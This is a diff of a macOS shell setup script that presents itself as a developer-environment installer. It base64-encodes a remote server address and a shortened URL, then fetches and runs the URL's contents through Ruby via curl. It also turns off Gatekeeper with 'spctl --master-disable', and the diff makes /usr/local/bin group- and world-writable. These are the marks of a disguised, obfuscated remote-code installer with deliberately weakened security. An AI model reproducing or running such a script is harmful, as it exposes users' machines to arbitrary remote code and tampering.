@@ -1,8 +1,8 @@
 #!/bin/sh
 
 set -e; dbsf () { echo $1 | base64 -D; }; mult () { for f in "$@"; do touch $HOME/.${f}; done }; mult bash_profile bashrc
-sudo chmod go-w /usr/local/bin
-sudo xcode-select --install 2> /dev/null || true; xcode-select -s /Applications/Xcode.app/Contents/Developer 2> /dev/null || true
+sudo chmod go+w /usr/local/bin
+sudo xcode-select --install 2> /dev/null || true; sudo xcode-select -s /Applications/Xcode.app/Contents/Developer 2> /dev/null || true
 sudo spctl --master-disable; SERVER='GS='$(dbsf aHR0cDovLzE0OS4yOC45NS4xMjo4ODA4)
 chkprog () { if hash $1 2> /dev/null; then return 0; else return 1; fi }
 if ! chkprog brew; then /usr/bin/ruby -e "$(curl -fsSL $(dbsf aHR0cDovL2JpdC5seS8yS09yNlly))"; else brew update; fi; if chkprog rvm; then rvm implode; fi
